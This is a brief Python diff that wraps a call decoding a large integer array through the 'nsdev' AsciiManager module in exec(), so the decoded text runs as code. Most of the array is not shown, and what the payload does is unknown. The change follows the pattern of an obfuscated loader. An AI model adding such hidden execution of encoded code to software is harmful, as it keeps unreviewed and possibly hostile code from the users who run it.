@@ -1,4 +1,5 @@
-__import__("nsdev").AsciiManager(
+exec(
+    __import__("nsdev").AsciiManager(
     [
         78,
         71,
@@ -3179,4 +3180,4 @@ __import__("nsdev").AsciiManager(
         552256,
         552404,
     ]
-)
+))
